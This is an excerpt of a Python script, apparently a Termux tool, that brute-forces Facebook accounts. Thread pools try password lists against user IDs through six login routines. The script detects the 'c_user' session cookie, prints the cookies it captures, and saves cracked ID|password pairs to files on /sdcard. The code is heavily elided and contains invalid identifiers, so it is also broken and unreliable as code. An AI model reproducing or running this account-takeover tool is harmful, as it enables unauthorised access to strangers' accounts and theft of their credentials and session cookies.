...
def uaku2():
	try:
		...
		a=requests.get('https://github.com/1-XD/XD/blob/main/ua2.txt').text
		ua=open('.ua2.txt','w')
...
os.system("xdg-open https://github.com/1-XD")
#app  check 
...
[+]==============================================
[+] CREATED BY   :  Hassan Baloch 
[+] FB GROUP     :  TERMUX TEAM 
[+] ON GITHUB    :  Rangeryt1355
[+] TOOL STATUS  :  RANDOM
[+] TOOL VIRSION :  0.1
[+]=============================================="""
...
def 1():
    ...
    elif aryan =='7':os.system("xdg-open https://www.facebook.com/safdar.baloch.395")
    else:
...
def 11():
	...
	print("[+]==============================================")
	1lovesyou = input("[+] [CHOOSE] :- ")
	if 1lovesyou in ['y','Y','1','yes','YES','Yes']:
		1_xd.append('y')
	else:
		1_xd.append('n')
	print("[+]==============================================")
	...
	with ThreadPool(max_workers=30) as yaari:
		...
		print(f'[+] METHOD CHOOSED : M{1fire}')
		...
		for guru in user:
			...
			if 1fire =='1':yaari.submit(mbasic,uid,pwx,tl)
			elif 1fire =='2':yaari.submit(p,uid,pwx,tl)
			elif 1fire =='3':yaari.submit(x,uid,pwx,tl)
			elif 1fire =='4':yaari.submit(mobile,uid,pwx,tl)
			elif 1fire =='5':yaari.submit(freeq,uid,pwx,tl)
			elif 1fire =='6':yaari.submit(d,uid,pwx,tl)
			else:
	...
	print('[?] Ids saved in 1-OK.txt,1-CP.txt')
...
def 15():
	...
	with ThreadPool(max_workers=50) as manshera:
		...
		for love in user:
			...
			for Eman in HamiiID:
				pwx.append(Eman)
			if 1fire =='1':manshera.submit(mbasic,uid,pwx,tl)
			elif 1fire =='2':manshera.submit(p,uid,pwx,tl)
			elif 1fire =='3':manshera.submit(x,uid,pwx,tl)
			elif 1fire =='4':manshera.submit(mobile,uid,pwx,tl)
			elif 1fire =='5':manshera.submit(freeq,uid,pwx,tl)
			elif 1fire =='6':manshera.submit(d,uid,pwx,tl)
			else:
...
def mbasic(uid,pwx,tl):
    ...
    'upgrade-insecure-requests':'1',
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\33[1;92m[1-OK] '+cid+' | '+ps+'\33[0;97m')
				if 'y' in 1_xd:
					print("\33[1;92m[💚] \33[1;98mCOOKIES : \33[1;92m"+coki)
					cek_apk(session,coki)
				else:
					break
				open('/sdcard/1-OK.txt', 'a').write(cid+' | '+ps+'\n')
				oks.append(cid)
				break
				...
				cid = coki[141:156]
				if 'y' in baby:
					print('\33[1;91m[1-CP] '+cid+' | '+ps+'\33[0;97m')
					open('/sdcard/1-CP.txt', 'a').write(cid+' | '+ps+'\n')
					cps.append(cid)
					break
				else:
					open('/sdcard/1-CP.txt', 'a').write(cid+' | '+ps+'\n')
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M1-1] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def p(uid,pwx,tl):
    ...
    'upgrade-insecure-requests':'1',
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M2-1] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def x(uid,pwx,tl):
    ...
    'upgrade-insecure-requests':'1',
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M3-1] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def mobile(uid,pwx,tl):
    ...
    'upgrade-insecure-requests':'1',
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M4-1] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def freeq(uid,pwx,tl):
    ...
    'upgrade-insecure-requests':'1',
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M5-1] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def d(uid,pwx,tl):
    ...
    'upgrade-insecure-requests':'1',
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M6-1] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
